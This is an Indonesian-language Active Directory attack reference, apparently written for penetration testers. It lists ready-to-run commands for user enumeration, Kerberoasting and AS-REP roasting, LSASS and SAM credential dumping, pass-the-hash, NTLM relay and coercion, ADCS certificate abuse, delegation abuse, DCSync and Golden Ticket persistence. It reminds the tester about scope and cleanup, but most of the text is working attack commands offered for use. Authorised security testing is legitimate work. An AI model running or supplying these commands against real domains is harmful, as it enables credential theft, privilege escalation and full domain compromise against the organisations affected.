# ACTIVE DIRECTORY — Attack Reference

> Untuk domain Windows. Alur umum: **foothold → enum domain → cari path ke DA → eksekusi → persistence**.
> BloodHound = peta jalan. Semua ke `loot/`. Ini area sensitif — pastikan in-scope & backup DC ada.

## Daftar Isi
1. [Enum tanpa/dengan creds](#enum)
2. [BloodHound](#bloodhound)
3. [Kerberos: AS-REP, Kerberoast](#kerberos)
4. [Credential access: dump](#creddump)
5. [Lateral movement](#lateral)
6. [Relay & coerce](#relay)
7. [ADCS (ESC1-8)](#adcs)
8. [Delegation](#deleg)
9. [DCSync & persistence](#dcsync)

---

<a name="enum"></a>
## 1. Enumerasi Domain

**Tanpa creds (dari network):**
```bash
kerbrute userenum -d corp.local --dc $DC users.txt      # valid user (no auth)
crackmapexec smb $DC -u '' -p '' --pass-pol             # password policy (hindari lockout)
enum4linux-ng -A $DC
ldapsearch -x -H ldap://$DC -b "DC=corp,DC=local"       # anonymous bind?
```

**Dengan creds (user domain apa saja):**
```bash
crackmapexec smb $DC -u user -p pass --users --groups --pass-pol --shares
ldapdomaindump -u 'corp\user' -p pass $DC -o loot/ldd
# Windapsearch / adPEAS untuk enum cepat
```

---

<a name="bloodhound"></a>
## 2. BloodHound (peta serangan)

```bash
# Collector Python (dari Linux)
bloodhound-python -d corp.local -u user -p pass -c All -ns $DC --zip
# atau SharpHound.exe -c All (dari Windows)
# Import zip ke BloodHound GUI → query:
#   "Shortest Path to Domain Admins", "Kerberoastable users", "AS-REP roastable",
#   "Users with DCSync", "Unconstrained delegation", ACL abuse (GenericAll/WriteDacl)
```

---

<a name="kerberos"></a>
## 3. Kerberos Attacks

**AS-REP Roasting** (user dengan "no preauth" → hash tanpa auth):
```bash
GetNPUsers.py corp.local/ -dc-ip $DC -usersfile users.txt -no-pass -format hashcat -o loot/asrep.txt
hashcat -m 18200 loot/asrep.txt rockyou.txt
```

**Kerberoasting** (SPN accounts → service ticket → crack offline):
```bash
GetUserSPNs.py corp.local/user:pass -dc-ip $DC -request -outputfile loot/kerb.txt
hashcat -m 13100 loot/kerb.txt rockyou.txt -r rules/best64.rule
# Target: service account sering password lemah + high priv.
```

---

<a name="creddump"></a>
## 4. Credential Access (setelah dapat akses ke host)

```bash
# Local SAM + LSA (butuh admin lokal)
secretsdump.py 'corp/user:pass@'$HOST                    # remote via impacket
crackmapexec smb $HOST -u user -p pass --sam --lsa --ntds

# Dari memori (Windows, admin) → mimikatz / nanodump
# sekurlsa::logonpasswords ; lsadump::sam ; lsadump::secrets
# Cari cleartext, NTLM, Kerberos keys, cached domain creds (DCC2 → crack -m 2100)

# LSASS dump minim-deteksi: comsvcs.dll MiniDump, nanodump, atau procdump (LOLBAS)
```

**Pass-the-Hash / Pass-the-Ticket:**
```bash
crackmapexec smb $NET -u user -H <NTLM> --local-auth        # PtH spray
psexec.py -hashes :<NTLM> corp/user@$HOST
export KRB5CCNAME=ticket.ccache; psexec.py -k -no-pass corp/user@$HOST   # PtT
```

---

<a name="lateral"></a>
## 5. Lateral Movement

```bash
psexec.py corp/user:pass@$HOST          # SYSTEM, noisy (service)
wmiexec.py corp/user:pass@$HOST         # WMI, lebih stealth
smbexec.py / atexec.py                  # variasi
evil-winrm -i $HOST -u user -p pass     # WinRM (5985)
# RDP: xfreerdp /u:user /p:pass /v:$HOST ; RestrictedAdmin PtH
```

---

<a name="relay"></a>
## 6. NTLM Relay & Coercion (signing disabled = fatal)

```bash
# Temukan host tanpa SMB signing
crackmapexec smb $NET --gen-relay-list loot/relay-targets.txt

# Relay
ntlmrelayx.py -tf loot/relay-targets.txt -smb2support -socks
# Coerce auth dari DC/host (paksa NTLM auth ke kita):
coercer coerce -u user -p pass -d corp.local -l <attacker> -t $DC   # PetitPotam/PrinterBug/dll
# Relay ke LDAP → RBCD / ke ADCS HTTP endpoint → ESC8 → DA
```

---

<a name="adcs"></a>
## 7. ADCS — Certificate Services (ESC1–ESC8)

```bash
certipy find -u user@corp.local -p pass -dc-ip $DC -stdout -vulnerable
# ESC1: template izinkan SAN arbitrary + client-auth → request cert sbg DA
certipy req -u user@corp.local -p pass -ca <CA> -template <T> -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip $DC   # dapat TGT/NT hash administrator
# ESC8: relay NTLM ke web enrollment (http://ca/certsrv) → cert DC → DCSync
```

---

<a name="deleg"></a>
## 8. Delegation Abuse

```
Unconstrained: host bisa impersonate siapa saja yang auth ke dia → coerce DC → dump TGT DC.
Constrained (S4U): kontrol akun dgn msDS-AllowedToDelegateTo → impersonate ke service tsb.
RBCD: punya WriteDACL/GenericWrite ke computer → set msDS-AllowedToActOnBehalfOfOtherIdentity
      → rbcd.py → getST.py -impersonate administrator → PtT.
```

---

<a name="dcsync"></a>
## 9. DCSync & Persistence (endgame — hati-hati)

```bash
# DCSync (butuh replikasi rights / DA) → tarik hash semua akun termasuk krbtgt
secretsdump.py -just-dc corp/admin:pass@$DC
# krbtgt hash → Golden Ticket (persistence total). Silver Ticket (per-service).
# CATATAN OPSEC: Golden/Silver ticket & skeleton key sangat berdampak → koordinasi dgn klien,
#   dokumentasikan, dan bersihkan setelah bukti diambil. Jangan tinggalkan persistence di produksi.
```

> **Rule:** buktikan path ke Domain Admin cukup untuk laporan. Tidak perlu merusak. Ambil bukti (screenshot
> whoami DA / akses DC), lalu bersihkan artefak (ticket, cert, akun tambahan).
